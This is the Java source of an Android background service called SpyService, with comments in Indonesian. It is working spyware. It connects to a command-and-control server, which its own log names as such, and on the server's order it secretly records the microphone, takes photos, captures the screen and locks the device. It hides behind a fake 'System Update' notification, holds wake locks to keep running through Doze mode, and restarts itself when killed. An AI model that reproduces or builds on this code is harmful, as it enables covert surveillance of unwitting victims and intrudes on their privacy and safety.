package com.nullx.pp;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.File;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class SpyService extends Service {

    private static final String CHANNEL_ID = "system_core_monitor";
    private static final String TAG = "CRPT_ZDX_ENGINE";
    
    private Socket mSocket;
    private MediaRecorder recorder;
    private boolean isRecording = false;
    
    // Heartbeat timer — jalan terus di background
    private java.util.Timer heartbeatTimer;
    private static final long HEARTBEAT_INTERVAL_MS = 25 * 1000; // 25 detik

    // Partial WakeLock — jaga CPU tetap jalan saat screen off
    private PowerManager.WakeLock wakeLock;
    private static final long WAKE_LOCK_TIMEOUT_MS = 10 * 60 * 1000; // 10 menit, diperpanjang tiap heartbeat

    @Override
    public void onCreate() {
        super.onCreate();
        startServiceInForeground();
        setupWakeLock();
        // Socket dan heartbeat diinit di onStartCommand
        // agar bisa handle delay untuk first-run vs restart
    }

    // ==========================================================
    // [+] PARTIAL WAKE LOCK — Jaga CPU saat screen off
    // ==========================================================
    private void setupWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:keepalive");
            wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);
            Log.d(TAG, "WakeLock acquired");
        } catch (Exception e) {
            Log.w(TAG, "WakeLock failed: " + e.getMessage());
        }
    }

    private void refreshWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:keepalive");
            wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);
        } catch (Exception e) {
            Log.w(TAG, "WakeLock refresh failed: " + e.getMessage());
        }
    }

    // ==========================================================
    // [+] ALARM MANAGER KEEPALIVE — Bypass Doze Mode
    // ==========================================================
    private void setupAlarmKeepalive() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent intent = new Intent("RestartSpyService");
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
                PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, flags);
            // setAndAllowWhileIdle = bypass Doze mode (API 23+)
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60000, pi);
            Log.d(TAG, "Alarm keepalive scheduled (60s)");
        } catch (Exception e) {
            Log.w(TAG, "Alarm keepalive failed: " + e.getMessage());
        }
    }
    
    // Ambil server URL dari SharedPrefs (disimpan oleh Flutter saat pertama buka)
    // Flutter shared_preferences menyimpan dengan prefix "flutter."
    private String getServerUrl() {
        // Coba baca dari FlutterSharedPreferences (disimpan oleh package shared_preferences)
        SharedPreferences flutterPrefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE);
        String url = flutterPrefs.getString("flutter.server_url", null);
        if (url != null && !url.isEmpty()) return url;
        
        // Fallback ke SpyPrefs (disimpan manual)
        SharedPreferences spyPrefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
        return spyPrefs.getString("server_url", "http://127.0.0.1:3000");
    }

    // ==========================================================
    // [+] NATIVE SOCKET LISTENER (ALWAYS-ON)
    // ==========================================================
    private void initNativeSocket() {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "unknown");
            String serverUrl = getServerUrl();

            IO.Options opts = new IO.Options();
            opts.query = "id=" + targetId + "&type=target";
            opts.forceNew = true;
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 3000;
            opts.reconnectionDelayMax = 10000;
            opts.timeout = 20000;

            mSocket = IO.socket(serverUrl, opts);

            mSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "CONNECTED TO C2 SERVER");
                // Kirim heartbeat langsung saat connect
                sendNativeHeartbeat();
            });
            
            // FIXED: Sinkronisasi nama event dengan Server.js (new_command)
            mSocket.on("new_command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.getString("command");
                    String extra = data.optString("extra", "");
                    
                    Log.d(TAG, "RECEIVED COMMAND: " + command);
                    
                    // Eksekusi logic native atau teruskan ke Flutter via Proxy
                    handleIncomingCommand(command, extra);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Execute Error: " + e.getMessage());
                }
            });

            // Backward compatibility jika server masih mengirim event 'execute'
            mSocket.on("execute", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    handleIncomingCommand(data.getString("command"), data.optString("extra", ""));
                } catch (Exception e) {}
            });

            mSocket.connect();
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket Config Error: " + e.getMessage());
        }
    }

    private void handleIncomingCommand(String cmd, String extra) {
        switch (cmd) {
            case "START_AUDIO_RECORD":
                startRecording();
                break;
            case "STOP_AUDIO_RECORD":
                stopRecording();
                break;
            default:
                // Teruskan ke MainActivity/main.dart untuk fungsi lainnya (Kamera, Strobe, dll)
                broadcastToApp(cmd, extra);
                break;
        }
    }

    private void broadcastToApp(String cmd, String extra) {
        // Mengirim ke Proxy Listener di main.dart
        Intent intent = new Intent("com.nullx.pp.COMMAND_PROXY");
        intent.putExtra("cmd", cmd);
        intent.putExtra("extra", extra);
        sendBroadcast(intent);
        
        // Force Wakeup untuk perintah kritis agar background process tidak ter-freeze oleh Doze Mode
        if(cmd.equals("take_photo") || cmd.equals("get_screen") || cmd.equals("hard_lock")) {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            startActivity(i);
        }
    }

    // ==========================================================
    // [+] NATIVE HEARTBEAT — Jalan terus walau Flutter mati
    // ==========================================================
    private void startHeartbeatTimer() {
        if (heartbeatTimer != null) {
            heartbeatTimer.cancel();
        }
        heartbeatTimer = new java.util.Timer();
        heartbeatTimer.scheduleAtFixedRate(new java.util.TimerTask() {
            @Override
            public void run() {
                sendNativeHeartbeat();
            }
        }, 5000, HEARTBEAT_INTERVAL_MS);
    }

    private void sendNativeHeartbeat() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                String serverUrl = getServerUrl();

                // Baca battery level
                android.content.Intent batteryIntent = registerReceiver(null,
                    new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                int level = 0;
                if (batteryIntent != null) {
                    int rawLevel = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    if (rawLevel >= 0 && scale > 0) {
                        level = (int) ((rawLevel / (float) scale) * 100);
                    }
                }

                java.net.URL url = new java.net.URL(serverUrl + "/api/heartbeat/" + targetId);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setDoOutput(true);

                JSONObject body = new JSONObject();
                body.put("battery", String.valueOf(level));

                try (java.io.OutputStream os = conn.getOutputStream()) {
                    os.write(body.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Heartbeat sent. Battery: " + level + "%");

                // Refresh WakeLock setiap heartbeat agar CPU tetap aktif
                refreshWakeLock();
                // Refresh AlarmManager keepalive
                setupAlarmKeepalive();
            } catch (Exception e) {
                Log.w(TAG, "Heartbeat failed: " + e.getMessage());
            }
        }).start();
    }

    // ==========================================================
    // [+] SERVICE CORE CONFIG (ANDROID 14/15 COMPLIANT)
    // ==========================================================

    private void startServiceInForeground() {
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing battery usage...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .setSilent(true)
                .setContentIntent(pendingIntent)
                .build();

        // FIXED: Implementasi Foreground Service Type untuk bypass proteksi API 34 & 35
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
            startForeground(101, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(101, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(101, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID,
                    "System Optimization Service", NotificationManager.IMPORTANCE_LOW);
            serviceChannel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Jika service di-restart oleh OS (bukan pertama kali), langsung init tanpa delay
        // karena targetId sudah tersimpan di SharedPrefs dari sesi sebelumnya
        if (mSocket == null || !mSocket.connected()) {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "unknown");
            boolean isFirstRun = targetId.equals("unknown");
            
            long delay = isFirstRun ? 3000 : 500;
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (mSocket == null) {
                    initNativeSocket();
                    startHeartbeatTimer();
                }
            }, delay);
        }
        // Schedule AlarmManager keepalive sebagai jaring pengaman
        setupAlarmKeepalive();
        return START_STICKY;
    }

    private void startRecording() {
        if (isRecording) return;
        try {
            File logFile = new File(getExternalFilesDir(null), "system_log.mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(logFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            isRecording = true;
        } catch (Exception e) { Log.e(TAG, "Rec Error: " + e.getMessage()); }
    }

    private void stopRecording() {
        if (recorder != null && isRecording) {
            try {
                recorder.stop();
                recorder.release();
            } catch (Exception e) { Log.e(TAG, "Stop Error: " + e.getMessage()); }
            finally { recorder = null; isRecording = false; }
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Auto-restart jika di swipe dari recent apps
        Intent restartIntent = new Intent(getApplicationContext(), SpyService.class);
        startService(restartIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        if (heartbeatTimer != null) {
            heartbeatTimer.cancel();
            heartbeatTimer = null;
        }
        if (mSocket != null) mSocket.disconnect();
        // Release WakeLock
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception e) {
            Log.w(TAG, "WakeLock release: " + e.getMessage());
        }
        // Trigger RestarterReceiver untuk menghidupkan kembali service
        sendBroadcast(new Intent("RestartSpyService"));
        super.onDestroy();
    }
}